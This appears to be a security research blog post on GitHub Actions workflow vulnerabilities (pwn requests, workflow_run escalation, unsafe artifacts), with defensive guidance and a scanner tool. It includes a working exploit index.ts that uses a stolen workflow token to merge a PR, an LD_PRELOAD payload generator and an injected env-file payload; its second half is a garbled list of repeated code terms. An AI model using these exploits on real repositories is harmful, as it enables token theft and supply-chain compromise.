@@ -1,0 +1,394 @@
+
+To address the need for streamlined code changes and rapid feature delivery, CI/CD solutions have become essential. Among these solutions, GitHub Actions, launched in 2018, has quickly garnered significant attention from the security community. Notable findings have been published by companies like Cycode and Praetorian and security researchers such as Teddy Katz and Adnan Khan. Our recent investigation reveals that vulnerable workflows continue to emerge in prominent repositories from organizations like Microsoft (including Azure), HashiCorp, and more. In this blog post, we will provide an overview of GitHub Actions, examine various vulnerable scenarios with real-world examples, offer clear guidance on securely using error-prone features, and introduce an open source tool designed to scan configuration files and flag potential issues.
+Github Actions overview
+GitHub Actions is a powerful CI/CD solution that enables the automation of workflows in response to specific triggers. Each workflow consists of a set of jobs executed on either GitHub-hosted or self-hosted runner virtual machines. These jobs are composed of steps, where each step can execute a script or an Action — a reusable unit hosted on the GitHub Actions Marketplace or any GitHub repository.
+Actions come in three forms:
+
+Docker: Executes a Docker image hosted on Docker Hub inside a container.
+JavaScript: Runs a Node.js application directly on the host machine.
+Composite: Combines multiple steps into a single action.
+Workflows are defined using YAML files located in a repository’s .github/workflows directory. Here is a basic example:
+1name: Base Workflow
+2on:
+3  pull_request:
+4
+5jobs:
+6  whoami:
+7    name: I'm base
+8    runs-on: ubuntu-latest
+9    steps:
+10      - run: echo "I'm base"
+Each workflow should include a name directive for reference, an on clause to specify triggers (such as the creation, modification, or closure of a pull request), and a jobs section that defines the jobs to be executed. Jobs run concurrently unless otherwise specified through conditional if statements.
+Refer to the official documentation for more detailed information on GitHub Actions and how to create them.
+Authentication and secrets in GitHub Actions
+GitHub Actions automatically generates a GITHUB_TOKEN secret at the start of each workflow. This token is used to authenticate the workflow and manage its permissions. The token’s permissions can be applied globally across all jobs in a workflow or configured separately for each job. The GITHUB_TOKEN is crucial as it allows users to modify repository contents directly or interact with the GitHub API to perform privileged actions.
+Additionally, GitHub Actions supports passing secrets to a job. Secrets are sensitive values defined in the project settings used for operations like authenticating to third-party services or accessing external APIs. If an attacker gains access to a secret, they could potentially extend the impact of an attack beyond GitHub Actions. Here's an example of a job using a secret:
+1name: Base Workflow
+2on:
+3  pull_request:
+4
+5jobs:
+6  use-secret:
+7    name: I'm using a secret
+8    env:
+9      MY_SECRET: ${{ secrets.MY_SECRET }}
+10    runs-on: ubuntu-latest
+11    steps:
+12      - run: command --secret “$MY_SECRET”
+As we’ve covered the basics, let’s dig deeper and see cases where misconfigured or outright vulnerable workflows can have security implications.
+Vulnerable scenarios
+One particularly problematic feature in GitHub Actions is the handling of forked repositories. Forking allows developers to add features to repositories for which they lack write permissions by creating a copy of the repository, complete with its entire history, under the user's namespace. Developers can then work on this forked repository, create branches, push code changes, and eventually open a pull request back to the upstream repository (also known as the "base"). After an upstream maintainer reviews and approves the pull request (PR), the changes can be merged into the base repository.
+In the context of a forked repository (referred to as "the context of the merge commit" in GitHub documentation), the user has complete control, and there are no restrictions on who can fork a repository. This creates a security boundary that GitHub is aware of. For example, the pull_request event is recommended for PRs originating from forks, as it doesn't have access to the base repository's context and secrets.
+Conversely, the pull_request_target event has full access to the base repository’s context and secrets and often includes read/write permissions to the repository. Suppose this event does not validate inputs such as branch names, PR bodies, and artifacts originating from the fork. In that case, it can compromise the security boundary, potentially leading to hazardous effects on the workflow.
+To help settle the confusion between the pull_request_target and pull_request triggers, here’s a table with the key differences:
+
+	pull_request	pull_request_target
+Context of execution	forked repo	base repo
+Secrets	⛔	✅
+Default GITHUB_TOKEN  permissions	READ	READ/WRITE
+Pwn request
+A "Pwn Request" scenario occurs when a workflow mishandles the pull_request_target trigger, potentially compromising the GITHUB_TOKEN and leaking secrets. Three specific conditions must be met for this issue to be exploitable:
+Workflow triggered by pull_request_target event: The pull_request_target event runs in the context of the base of the pull request, not in the context of the merge commit, as the pull_request event does. This means that the workflow will execute the code in the context of the upstream repository, which a user of the forked repository should not have access to. Consequently, the GITHUB_TOKEN is typically granted write permissions. The pull_request_target event is intended to be used with safe upstream code, hence an additional condition is needed to break this boundary.
+Explicit checkout from the forked repository:
+1- uses: actions/checkout@v2
+2	with:
+3		ref: ${{ github.event.pull_request.head.sha }}
+Note: github.event.pull_request.head.ref is also a dangerous option. The ref clause points to the forked repository, and checking it out means the job will run code fully controlled by an attacker.
+Code execution or injection point: This is where the damage occurs. Suppose an attacker has complete control over the checked-out code. In that case, they can replace any script that gets executed in subsequent steps with a malicious version, modify a configuration file with command execution potential (e.g., package.json used by npm install), or exploit a command injection vulnerability within a step to execute arbitrary code. The extent of the damage depends on how the permissions are configured and whether there are any secrets that can be leaked to compromise additional services. Since the GITHUB_TOKEN's lifecycle is limited to the currently running workflow, an attacker must craft the exploit to run within that window.
+For a deep dive into how secrets can be leaked from GitHub Actions, refer to Karim Rahal’s excellent write-up.
+workflow_run privilege escalation
+The workflow_run trigger in GitHub Actions is designed to run workflows sequentially rather than concurrently — starting one workflow after completing another. However, the subsequent workflow is executed with write permissions and access to secrets, even if the triggering workflow does not have such privileges. This creates a potential security risk similar to those previously discussed. How can an attacker exploit these elevated privileges?
+Control over the triggering workflow: The triggering workflow must be completed successfully and controlled by the attacker. For instance, this workflow can be triggered by the pull_request event, which runs in the context of the merge (or forked) repository and is intended to run unsafe code.
+Workflow triggered with workflow_run: A subsequent workflow must be triggered by the workflow_run event and explicitly check out the unsafe code from the forked repository:
+1- uses: actions/checkout@v4
+2  with:
+3    repository: ${{ github.event.workflow_run.head_repository.full_name }}
+4    ref: ${{ github.event.workflow_run.head_sha }}
+5    fetch-depth: 0
+Notice the repository and ref input variables pointing to the attacker-controlled code. This code is now granted elevated privileges for the workflow_run event, leading to privilege escalation.
+Code execution or injection point: Similar to previous scenarios, an attacker needs a code execution or injection point in order to take over the triggered workflow.
+Unsafe artifact download
+As we’ve seen in the case of pull_request_target and workflow_run, running workflows with read-write privileges to an upstream repo on untrusted code can be hazardous. According to official Github docs, it’s recommended to split the workflow into two: one that does unsafe operations, such as running build commands on a low-privileged workflow, and one that consumes the output artifacts and performs privileged operations, such as commenting on the PR. By itself, this is perfectly safe, but what happens if the privileged workflow uses the artifact unsafely?
+Let’s take a look at the following example.
+upload.yml:
+1name: Upload
+2
+3on:
+4  pull_request:
+5
+6jobs:
+7  test-and-upload:
+8    runs-on: ubuntu-latest
+9    steps:
+10      - name: Checkout
+11        uses: actions/checkout@v4
+12      - name: Run tests
+13        Run: npm install
+14      - name: Store PR information
+15        if: ${{ github.event_name == 'pull_request' }}
+16        run: |
+17          echo ${{ github.event.number }} > ./pr.txt
+18      - name: Upload PR information
+19        if: ${{ github.event_name == 'pull_request' }}
+20        uses: actions/upload-artifact@v4
+21        with:
+22          name: pr
+23          path: pr.txt
+download.yml:
+1jobs:
+2  download:
+3    runs-on: ubuntu-latest
+4    if:
+5      github.event.workflow_run.event == 'pull_request' &&
+6      github.event.workflow_run.conclusion == 'success'
+7    steps:
+8    - uses: actions/download-artifact@v4
+9      with:
+10        name: pr
+11        path: ./pr.txt
+12    - name: Echo PR num
+13        run: |
+14          PR=$(cat ./pr.txt)
+15          echo "PR_NO=${PR}" >> $GITHUB_ENV
+An attacker can create a PR that replaces package.json with a crafted one to execute arbitrary code in the npm install step and trigger the upload workflow. They can add a preinstall script that sets LD_PRELOAD to replace the pr.txt file with a malicious one like 1\nLD_PRELOAD=[ATTACKER_SHARED_OBJ]. When this file is read in the download workflow, the LD_PRELOAD payload will be injected into GITHUB_ENV in the echo command. If an attacker can also download a shared object, e.g., by downloading a second artifact they control, the entire privileged workflow can be compromised.
+Self-hosted runners
+Github Actions provides hosted ephemeral runners to execute workflows. If a user wishes, they can set up a self-hosted runner over which they have full control. This doesn’t come without a price — if it gets compromised, an attacker can persist on the runner and infiltrate other workflows running on the same host and other hosts on the internal network. When these runners are configured in public repos, they increase the attack surface as they can execute code that doesn’t only originate from the repo maintainers and trusted developers. A detailed exploration of this vector can be found in Adnan Khan’s blog.
+Vulnerable actions
+Actions are also a viable attack vector to compromise a workflow. Since Actions are hosted on Github, taking over one can trigger a supply-chain attack on all the workflows that depend on it. But one does not have to go that far — actions are just scripts often running directly on the runner host (and sometimes inside Docker containers). They receive data from the calling job through inputs and can access the global Github context and secrets. Essentially, whatever a calling workflow can do, a callee Action can also do it. If an Action contains a “classical” vulnerability, such as a command injection and an attacker that can trigger it with some input they control, they can take over the entire workflow.
+Exploit techniques
+Once a vulnerable workflow is discovered, the next question is, can it be exploited with a meaningful impact? Here are a couple of techniques we’ve found useful:
+Code or command injection in a step: In the case, an attacker has control over the contents of a pull request, e.g., when a workflow triggers on pull_request_target, they can achieve arbitrary code execution in a handful of ways, including:
+
+Taking over a package manager install command — the most common example that comes to mind is adding a preinstall or postinstall script in a package.json file that will be executed in an npm install command. Of course, this is not limited to Node.js, as package managers have similar features in other ecosystems as well. For more examples, check out the Living-Off-The-Pipeline page.
+Taking over an action hosted on the same repo — Actions can be hosted on any Github repo, including the one that contains the workflow. When the step’s uses clause starts with ./, the code is contained in a subfolder within the repo. Replacing the action.yml file or one of the source files that will run, e.g., the index.js file in JavaScript, will run the code injected by the attacker.
+Using env var injection to set LD_PRELOAD: Github already considers environment variable injection a threat, hence limiting the ones a user can set. For instance, additional cli args can be provided to the node binary through the NODE_OPTIONS env var. If not restricted, an attacker could inject payload into that env var, which would lead to command execution. As a result, Github prevents NODE_OPTIONS from being set in a workflow, as detailed here. One env var that is not restricted is LD_PRELOAD. LD_PRELOAD points to a shared object loaded by the Linux dynamic linker into the process memory before all others do. This allows function hooking, e.g., overwriting function calls with custom code mainly used for instrumentation. By overwriting a syscall like open() or write() used in filesystem operations, an attacker can inject code that’ll get executed from the point of injection and on.
+To illustrate some of these techniques, let's look at a real-world example.
+terraform-cdk-action Pwn request
+The terraform-cdk-action repo contains an action created by Terraform. Compromising the Github Actions workflow of this kind of repo is particularly dangerous as modifications to the action can further compromise workflows depending on it.
+The vulnerability exists in the integration-tests.yml workflow:
+1pull_request_target: << This triggers the workflow
+2   types:
+3     - opened
+4     - ready_for_review
+5     - reopened
+6     - synchronize
+7...
+8integrations-tests:
+9 needs: prepare-integration-tests
+10 runs-on: ubuntu-latest
+11 steps:
+12   - name: Checkout
+13     uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+14     with:
+15       ref: ${{ github.event.pull_request.head.ref }} << Unsafe checkout from fork
+16       repository: ${{ github.event.pull_request.head.repo.full_name }}
+17...
+18   - name: Install Dependencies
+19     run: cd test-stacks && yarn install << This installs the attackers ‘package.json’
+20   - name: Integration Test - Local
+21     uses: ./ << This runs the local action, from within the PR
+22     with:
+23       workingDirectory: ./test-stacks
+24       stackName: "test-stack"
+25       mode: plan-only
+26       githubToken: ${{ secrets.GITHUB_TOKEN }} << This token can be stolen
+27       commentOnPr: false
+28   - name: Integration Test - TFC
+29     uses: ./ << This runs the local action, from within the PR
+30     with:
+31       workingDirectory: ./test-stacks
+32       stackName: "test-stack"
+33       mode: plan-only
+34       terraformCloudToken: ${{ secrets.TF_API_TOKEN }} << This token can be stolen
+35       githubToken: ${{ secrets.GITHUB_TOKEN }} << This token can be stolen
+36       commentOnPr: false
+This workflow is used to test the action within its own repo. Looking into the action.yml file, we can see that the index.ts (compiled to JavaScript) is the main file that gets executed:
+1name: terraform-cdk-action
+2description: The Terraform CDK GitHub Action allows you to run CDKTF as part of your CI/CD workflow.
+3runs:
+4  using: node20
+5  main: dist/index.js
+The workflow references it in the uses: ./ clause. Hence, all we need to do is modify it, and it’ll be executed. Here’s a look at the crafted index.ts:
+1import * as core from "@actions/core";
+2import { run } from "./action";
+3
+4import { execSync } from 'child_process';
+5
+6console.log("\r\nPwned action...");
+7console.log(execSync('id').toString());
+8
+9const tfToken = Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("-")).toString('base64');
+10const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").reverse().join("-")).toString('base64');
+11
+12console.log('Testing token...');
+13const str = `# Merge PR
+14curl -X PUT \
+15    https://api.github.com/repos/mousefluff/terraform-cdk-action/pulls/2/merge \
+16    -H "Accept: application/vnd.github.v3+json" \
+17    --header "authorization: Bearer ${process.env.INPUT_GITHUBTOKEN}" \
+18    --header 'content-type: application/json' \
+19    -d '{"commit_title":"pwned"}'`;
+20
+21execSync(str, { stdio: 'inherit' });
+22
+23run().catch((error) => {
+24  core.setFailed(error.message);
+25});
+We tested this on a copy of the original repo, so we won’t tamper with it. Since the pull_request_target trigger has write permissions to the base repo by default and it wasn’t restricted in any way or fashion, we were able to merge a PR with the compromised token successfully:
+And we can see that the PR was successfully merged by the github-actions[bot]:
+How to secure your pipelines
+Securing Github Actions workflows depends on the implementation, and that can vary significantly. Different trigger scenarios require different safeguards. Let’s explore the various issues we’ve detailed and offer potential ways to mitigate them with some concrete examples for reference.
+Avoid running privileged workflows on untrusted code — when using the pull_request_target or workflow_run triggers, do not checkout code from forked repos unless you have to. Meaning - ref shouldn’t point to the likes of github.event.pull_request.head.ref or github.event.workflow_run.head_sha. Since these triggers run in the context of the base repo with read/write permissions granted to the GITHUB_TOKEN by default and access to secrets, compromising these workflows is especially dangerous.
+If checking out the code is a must, here are some additional safety measures:
+Validate the triggering repo/user: Add an if condition to the checkout step to limit the triggering party:
+1jobs:
+2  validate_email:
+3    permissions:
+4      pull-requests: write
+5    runs-on: ubuntu-latest
+6    if: github.repository == 'llvm/llvm-project'
+7    steps:
+8      - name: Fetch LLVM sources
+9        uses: actions/checkout@v4
+10        with:
+11          ref: ${{ github.event.pull_request.head.sha }}
+Taken from llvm/llvm-project. Notice the if condition that checks if the triggering Github repo is the base repo, thus blocking PRs triggered by forks.
+Here’s another example, this time by checking that the user that created the PR is a trusted one:
+1jobs:
+2  merge-dependabot-pr:
+3    runs-on: ubuntu-latest
+4    if: github.actor == 'dependabot[bot]'
+5    steps:
+6
+7      - uses: actions/checkout@v4
+8        with:
+9          show-progress: false
+10          ref: ${{ github.event.pull_request.head.sha }}
+In spring-projects/spring-security, github.actor is checked for Dependabot, thus blocking PRs originating from other users from running the job.
+Run the workflow only after manual validation: This can be done by adding a label to the PR.
+1name: Benchmark
+2
+3on:
+4  pull_request_target:
+5    types: [labeled]
+6
+7jobs:
+8  benchmark:
+9    if: ${{ github.event.label.name == 'benchmark' }}
+10    runs-on: ubuntu-latest
+11...
+12    steps:
+13      - uses: actions/checkout@v4
+14        with:
+15          persist-credentials: false
+16          ref: ${{github.event.pull_request.head.sha}}
+17          repository: ${{github.event.pull_request.head.repo.full_name}}
+This example taken from fastify/fastify shows a workflow triggered by a PR only when it’s labeled with “benchmark.” These if-condition statements can be applied both on the job and on a specific step level.
+Check that the triggering repo matches the base repo: This is another way to restrict PRs originating from forked repos. For a workflow that triggers on pull_request_target, let’s look at the following if condition:
+1jobs:
+2  deploy:
+3    name: Build & Deploy
+4    runs-on: ubuntu-latest
+5    if: >
+6      (github.event_name == 'pull_request_target' && contains(github.event.pull_request.labels.*.name, 'impact/docs'))
+7      || (github.event_name != 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository)
+As can be seen in python-poetry/poetry, notice the check that github.event.pull_request.head.repo.full_name coming from the PR event context matches the base repo github.repository.
+Similarly, for a workflow that triggers on workflow_run, this will look like:
+1jobs:
+2  publish-latest:
+3    runs-on: ubuntu-latest
+4    if: ${{ (github.event.workflow_run.conclusion == 'success') && (github.event.workflow_run.head_repository.full_name == github.repository) }}
+As demonstrated in TwiN/gatus.
+Treat actions the same as you would 3rd-party dependencies. Anyone familiar with the open source world and developer security hopefully knows by now the dangers of using packages stored in public code registries. Actions are the Github Actions’ dependency counterpart. If you’re using one, make sure to vet the repo that stores it. Once done, you can pin the action to a commit hash (a version tag is not good enough) to make sure that Github Actions will not pull a new version of it once it’s updated. This ensures that if the action gets compromised, you won’t suffer the consequences. An action can be pinned by using the @ sign after the action’s name:
+1steps:
+2      - uses: actions/checkout@9bb56186c3b09b4f86b1c65136769dd318469633 # v4.1.2
+Handling untrusted artifacts in Github Actions: Artifacts generated by workflows running on untrusted code should be treated with the same caution as user-controlled code, as they can potentially serve as an entry point for attackers into a privileged workflow. To mitigate this risk, when downloading artifacts using the github/download-artifact action, always specify a path parameter. This ensures the contents are extracted to a designated directory, preventing any accidental overwriting of files in the job’s root directory that could later be executed in a privileged context. Additionally, developers should ensure that the contents of these artifacts are properly escaped and sanitized before being used in any sensitive operations. By taking these precautions, you can significantly reduce the risk of introducing vulnerabilities through untrusted artifacts.
+Restrict the code that runs on self-hosted runners: By default, PRs coming from forked repos need approval to execute workflows if the owner is a first-time contributor to the repo. If they’ve already contributed code, in as little as fixing a typo, the workflows will run automatically on their PRs. Obviously, this is an easy hurdle to pass, so the first recommendation is to set that setting to require approval for all external contributors:
+There’s also a hardening tool by step-security/harden-runner designed to be the first step in any job in a workflow. A word of caution - hardening RCE-as-a-service solutions is not an easy task to accomplish so using this might not be without risk.
+Adhering to the least privilege principle: In the worst case, a workflow gets compromised, an attacker can run arbitrary code. Restricting the permissions of the GITHUB_TOKEN can be the last line of defense preventing an attacker from fully taking over a repo. This can be done globally in the repo’s settings, for each workflow, or even for jobs in the YAML config file. Special attention should be given to workflows that trigger on events like pull_request_target and workflow_run that have full read/write access to the base repo by default.
+Community tool: Github Actions scanner
+In order to scan issues in your Github Actions workflows and actions, we created a CLI tool — Github Actions Scanner. Given a Github repo or an org, it’ll parse all the YAML config files and use a regex-based rule engine to flag findings. It also has features that can facilitate exploitation:
+Auto creation of a copy of the target repo: If an issue is found and requires some additional validation or developing an exploit, we don’t want to do this on the target repo to avoid affecting the actual code and the risk of exposing the issue before it was responsibly disclosed and fixed. As a result, we can create a fresh copy of the repo on a Github user or org of choice to perform isolated testing.
+LD_PRELOAD payload generation: When command injection is possible, using LD_PRELOAD to compromise subsequent steps is usually a great way to take over a workflow. Thus, we have created a proof-of-concept (POC) generator based on the following template:
+1const ldcode = Buffer.from(`#include <stdlib.h>
+2void __attribute__((constructor)) so_main() { unsetenv("LD_PRELOAD"); system("${command.replace("\"", "\\\"")}"); }
+3`)
+4     const code = Buffer.from(`echo ${ldcode.toString("base64")} | base64 -d | cc -fPIC -shared -xc - -o $GITHUB_WORKSPACE/ldpreload-poc.so; echo "LD_PRELOAD=$GITHUB_WORKSPACE/ldpreload-poc.so" >> $GITHUB_ENV`)
+It implements the following steps:
+
+Create a small Base64 encoded C program that invokes the system syscall on a command specified by the user.
+Decode and compile it to a shared object in the $GITHUB_WORKSPACE root dir.
+Set LD_PRELOAD to the shared object and load it into the GITHUB_ENV.
+Conclusion
+In this research, we provided an overview of Github Actions-related vulnerabilities and security hazards. Due to the multitude of options and the need for clarity in the official documentation, developers are still getting these wrong, resulting in compromised CI/CD pipelines. Make no mistake, misconfigured and outright vulnerable workflows are not unique to Github Actions, and special care must be taken to secure them. As modern supply chain scanners and static analyzers still can fail to detect these, developers must adhere to safe best practices. We created an open source tool to help fill in the gaps and flag potential issues. As more research is done in this area, this blog and others can help drive the developers’ focus and educate them so that the occurrence of these bugs diminishes.
+Docker: Executes a Docker image hosted on Docker Hub inside a container.
+JavaScript: Runs a Node.js application directly on the host machine.
+Composite: Combines multiple steps into a single action.
+.github/workflows
+name
+on
+jobs
+if
+GITHUB_TOKEN
+GITHUB_TOKEN
+pull_request
+pull_request_target
+pull_request_target
+pull_request
+
+pull_request
+pull_request_target
+Context of execution
+forked repo
+base repo
+Secrets
+⛔
+✅
+Default GITHUB_TOKEN  permissions
+READ
+READ/WRITE
+pull_request
+pull_request_target
+GITHUB_TOKEN
+pull_request_target
+GITHUB_TOKEN
+pull_request_target
+pull_request_target
+pull_request
+GITHUB_TOKEN
+pull_request_target
+github.event.pull_request.head.ref
+package.json
+npm install
+GITHUB_TOKEN
+workflow_run
+pull_request
+workflow_run
+workflow_run
+repository
+ref
+workflow_run
+pull_request_target
+workflow_run
+package.json
+npm install
+preinstall
+LD_PRELOAD
+pr.txt
+1\nLD_PRELOAD=[ATTACKER_SHARED_OBJ]
+LD_PRELOAD
+GITHUB_ENV
+inputs
+pull_request_target
+Taking over a package manager install command — the most common example that comes to mind is adding a preinstall or postinstall script in a package.json file that will be executed in an npm install command. Of course, this is not limited to Node.js, as package managers have similar features in other ecosystems as well. For more examples, check out the Living-Off-The-Pipeline page.
+preinstall
+postinstall
+package.json
+npm install
+Taking over an action hosted on the same repo — Actions can be hosted on any Github repo, including the one that contains the workflow. When the step’s uses clause starts with ./, the code is contained in a subfolder within the repo. Replacing the action.yml file or one of the source files that will run, e.g., the index.js file in JavaScript, will run the code injected by the attacker.
+uses
+./
+action.yml
+index.js
+node
+NODE_OPTIONS
+NODE_OPTIONS
+LD_PRELOAD
+LD_PRELOAD
+open()
+write()
+terraform-cdk-action
+integration-tests.yml
+index.ts
+uses: ./
+index.ts
+pull_request_target
+github-actions[bot]
+pull_request_target
+workflow_run
+- ref
+github.event.pull_request.head.ref
+github.event.workflow_run.head_sha
+GITHUB_TOKEN
+if
+github.actor
+pull_request_target
+if
+github.event.pull_request.head.repo.full_name
+github.repository
+workflow_run
+@
+github/download-artifact
+path
+GITHUB_TOKEN
+pull_request_target
+workflow_run
+LD_PRELOAD
+LD_PRELOAD
+Create a small Base64 encoded C program that invokes the system syscall on a command specified by the user.
+system
+Decode and compile it to a shared object in the $GITHUB_WORKSPACE root dir.
+$GITHUB_WORKSPACE
+Set LD_PRELOAD to the shared object and load it into the GITHUB_ENV.
+LD_PRELOAD
+GITHUB_ENV
